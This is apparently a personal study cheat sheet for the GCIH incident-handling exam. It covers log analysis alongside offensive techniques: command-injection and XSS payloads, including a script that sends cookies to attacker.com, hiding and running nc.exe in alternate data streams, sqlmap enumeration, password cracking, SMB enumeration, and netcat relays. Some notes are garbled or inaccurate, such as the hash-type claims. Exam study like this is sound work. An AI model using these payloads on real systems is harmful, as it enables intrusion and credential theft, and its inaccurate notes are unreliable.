# GCIH - Summary Cheat Sheet

## Squid Proxy log field meaning
	$DateTime:date:unixm$ $ElapsedTime:number$ $RemoteHost:ip$ $Code$/$Status$ $BytesSent:number$ $Method$ $URL$ $User:word$ $PeerStatus:word$/$PeerHost$ $ContentType$


## Looking for WMI persistence Objects:
    `Get-WMIObject -Namespace root\Subscription -Class_EventFilter | fl -property query`


	
## WMI titbits
### execute EXE in an ADS
    `wmic process call create C:\temp\text.txt:nc.exe`
### Get process info
    `wmic process call `

## ADS (alternate Data Steam)
### create an ADS of a file
    `notepad <your front file>:<your file to send to ADS of front file>` type something into notepad and save.
    e.g., `notepad front.txt:hidden.txt`
#### redirect contents of an existing file to the ADS of another file
`type evil.exe > c:\front.txt:evil.exe`
### execute EXE in an ADS
    `wmic process call create C:\temp\text.txt:nc.exe`
### How to find ADS
1. Use `LADS` tool by Frank Heyne
2. `dir /r`
3. powershell (replace * by unique files,paths, or stream names as needed. 
    `Get-Item * -stream *`
    `Get-Content * -Stream *`

## Event logs:
### powershell
    1. `Get-WinEvent -FilterHashTable @{LogName='Security';ID='4720'}`
    2. `Get-WinEvent Security | Where-object Id -eq '4720' | fl TimeCreated, Message`
### wevutil (win7)
    `wevutil qe security /f:text`
    
### DeepBlueCLI 
-good quick method to analze event logs for interesting events
  - `DeepBlue.ps1 logfile.evtx`
  - `deepblue.ps1 -Log System/security/etc`
  - Against remote host:
    1. `$credential = get-credential`
    2. `deepblue.ps1 -log <logname> -Hostname <hostname> -Credential $credential`

## Command Injection Patterns
```
-h
; echo Injected
| echo Injected
|| echo Injected
& echo Injected
&& echo Injected
$(echo Injected)
`echo Injected
>(echo Injected)
```

## XSS paste this simbols into parameters and check source code to see if they get printed back verbatim
```
(";!--"<XSS>=&{()}
Common XSS attacks
<script<alert('xss');</script>
src=javascript:alert('XSS');
<script>document.location='http://attacker.com/save.php?c='+document.cookie</script>
```


## SQL Injection
```
='or'='
SQL command delimiter --
SQL query terminator ;
```

## SQL map:
```
if you are gonna use sqlmap first go to the form, add someting to each form parameter (antything), and click submit (use the URL with the list of paramters for sqlmap to work with)
sqlmap -u "http://domain/page/script.php?c=1&name=john&last=snow......" 
--dbs first to list databases
-D <database name> --tables   (to get table names)
```
	
	
## BPF (berkley packet filter)
```
type: host, net, port, portrange
dir: (direction) src, dst
proto: ip, tcp, udp, icmp, etc
operators: and &&, or ||, not !
use parenthesis to group as needed
```
	
## tcpdump (pcapng supports comments):
```
uses BPFs
tcpdump -r <file.pcap> 'src host <ip>'
```
	
## NMAP  
```
(if you SSHed into a host check ifconfig to see what ranges to scan are avaible) 
(if nmap is not present use net cat for scanning)
sudo nmap -p0-10000 <dest IP or CIDR>
hostscan -sn 192.168.0.0/24   (it uses ICMP echo, ICMP Timestamp, and a few other methods)
aggressive scan -A  (use this on test)
--script  <script name> --script-args <script args name=arg value>
--reason to show why it was determined up/down open/closed
-p- (all) ports -p 0-1024  (range) -p 1,2,3  (list)
-sV for version will do more tests to get what service name. server, etc is running. (includded in -A command)
```



## Metasploit
Practice searching for payload and exploits inside of metasploit: `search type:exploit psexec`


## volatility
```
print the sans cheat sheet
- Use 
    `export VOLATILITY_LOCATION="file:///home/...././/file.mem"`	
    `export VOLATILITY_PROFILE="Win..."`


## Passwords

### Hashcat 
- -m (hash type). [## linux password format] Full list here https://hashcat.net/wiki/doku.php?id=example_hashes
- -a attack modes 

| # | Mode |
| --- | -------------------- |
| 0 | Straight |
| 1 | Combination |
| 3 | Brute-force |
| 6 | Hybrid Wordlist + Mask |
| 7 | Hybrid Mask + Wordlist |
| 9 | Association |
  


### John The Ripper
*if you don't specify a is defaults to a (--single) attack mode where it uses wordlist generated from the passwd file GECOS fields for each user *combinator attack is part of hashcat*
    ```
    unshadow passwd shadow > combined
	john combined
    ```
#### Parmeters
##### Attack types
- `--single`
- `--wordlist=\path\to\wodlist.txt`
- 
##### Show 
- `--show` to show all passwords (cracked and missing) 
- `--show=left` to show uncracked ones

##### Format
* this defines the type of hash *
- `--list=formats` to list all available formats
- `--format=descrypt`
- `--format=md5crypt`
- `--format=sha256crypt`
- `--format=sha512crypt`
- etc

### Formats
#### Linux password format in shadow file
`$hashtype$salt$pwdhash`
* &linux shadow file hash type markers, encryption is DESCRYPT for ALL OF THEM:& *

| marker | hashtype |
| --- | ----------- |
| $1$ | MD5 |
| $2$ | Blowfish |
| $3$ | Blowfish |
| $5$ | SHA-256 |
| $6$ | SHA-512 |

* For password cracking with john you'll use a descrypt variant in the `--format=<hashformat>` command *

#### EMPTY HASHES memory aid:
- NT: 31D.CFE.D.....
- NTLM: aad...b..b..........404ee


## SMB
### SMB reconnaisance
- multiple ways. rcpclient, smbclient, net use, etc.
- An attacker tools for it is sharpview, only needs a simple account's creds to work. 


### rpcclient  
* (uses SMB normally uses $IPC share but could use others?)*
	`rpcclient <ip> -U <user>`  (you'll be prompted for pwd)
	`srvinfo`  (system info)
	* if you don't remember a command use help or tab completion
- `enumdomusers` (local and domain users that the system knows about)  you'll get the name and the last part of the SID (the RID in hex)
- the RID of the local admin account is always '0x1f4'
- Get full (non hex) SID of user:
		`loookupnames <username>`
- with the outcome of the lookup names use the last part of the SID (RID) to get LOTS OF USER ACCOUNT DETAILS:
		`queryuser <RID>`	
- full order of operations:
		`enumdomusers >>> lookupnames <username> >>> queryuser <non hex RID>`
- getting groups:
		`enumalsgroups domain`
		`enumalsgroups builtin`

### smbclient 
- list all shares on a windows system:
	`smbclient -L //<ip> -U <user> -m` (SMB1, SMB2, or NT1 aka SMBv1  you could use it to see what version of SMB is available)
- connect to a host's share:
	`smbclient -U <user> //<ip>/<sharename> -m SMB2`  (optional param)


## Who's Who of NET Something

### NET.EXE commands 
https://ss64.com/nt/net.html

#### net use  - connect / map an remote SMB share to you host - 
- no creds, it uses your logged in account creds.
- no share specified just IP it will connect the available admin share ussuallly IPC$
	`net use \\<ip>`
- host and share and creds
	`net use \\<ip>\<sharename> <password> /u:<username>`
- terminate SMB connection / dismout shre (2 options)
	`net use /delete \\<ip>\share`
	`net use \\<ip> \del`

#### net view - once you've mapped a share with net use, list available shares with this
	net view \\<ip>
	
		
#### net session  - show or manage existing SMB sessiong TOWARDS YOUR HOST. use it during IR /investigation
	list:
		net session
	delete (disconnect an attacker)
	net session \\<ip> /del

#### net user /domain
	list users on host
	
#### net localgroup administrators
	show who is in the admin group

### netsh (windows tool, lolbin)
	get host firewall settings
		netsh advfirewall show currentprofile
	port forwarding:
		netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8000 connectaddress=10.10.10.100


### netstat -  to examin network ussage
	netstat -na (look for unussual tCp UDP ports)
	netstat -naob (shows process ID and associatee EXE/DLL)
	netstat -naob 5 (auto refresh every 5 seconds)
    
### netcat (print cheat )
- RFeminder you can't listen for connections for a particular IP only of a particular port e.g., `nc -l -p 3333`
- NC Relay: `makefifo namedpipe; nc -l -p 8888 < namedpipe | nc <dest ip> <dest port> > namedpipe`
- Get banner or other data from an open port:   `nc <ip> <port> > output.txt`

	
## DNS
- Many packets on TCP port 53 is likely a zone transfer:
  - FULL PROCESS:
    - run whois on a domain , pick on of their name servers NS....
		resolve NS IP using 'host' command. e.g., host <ns....>
		(optional send A record request to  dns server in particular) `dig @<name sever IP> A <domain name>`
	- request zone transfer (with optional +short command):
             with nslookup:
                    ```
                    nslookup 
                        server <dns server IP>
                        set type=any
                        ls -d <URL>
                    ```
    
                with DIG:
                    dig +short @<NS IP> AXFR <domain name>
- Host querying a large ammount subdomains for a single domain on a short period is potential tunneling 
	

## RITA (runs on ZEEK logs data) different analytic types detect different things:
- long running sessions > meterpreter type sessions
- burst of packets > ???
- callback frequency (including skew .e.g, +-1min) > potencial beaconing
- You can add FP suppressions in the config.yaml file
	
